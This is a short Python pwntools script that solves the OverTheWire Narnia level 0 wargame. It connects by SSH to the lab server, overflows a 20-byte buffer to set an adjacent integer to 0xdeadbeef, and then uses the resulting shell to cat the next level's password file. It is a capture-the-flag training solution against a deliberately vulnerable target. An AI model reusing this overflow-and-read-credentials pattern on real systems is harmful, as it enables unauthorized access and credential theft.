#!/usr/bin/env python2
from __future__ import print_function
import pwn
import getpass
import sys
import struct

# Configuration variables
config = {
        'user': 'narnia0',
        'executable': '/narnia/narnia0',
        'password_file_path': '/etc/narnia_pass/narnia1',
        'host': 'narnia.labs.overthewire.org',
        'port': 2226
        }
pwn.context.arch = 'i386'
pwn.context.os = 'linux'

# Get password for SSH login
try:
    password = getpass.getpass(prompt='{} password: '.format(config['user']))
except Exception as e:
    print('[-] Error getting password: ' + e)
    sys.exit(-1)

# Login to SSH
s = pwn.tubes.ssh.ssh(host=config['host'],
                      port=config['port'],
                      user=config['user'],
                      password=password)

# 20 bytes of char array, last 4 are an int we need to change
payload = ('A' * 20) + struct.pack('<L', 0xdeadbeef)

p = s.process(executable=config['executable'])
p.write(payload)
# Read the output of the program
p.recvlines(3)
# Cat the password file
p.sendline('cat {}'.format(config['password_file_path']))
# Print the retrieved password
print('Narnia1 password: {}'.format(p.recvline().split()[-1]))
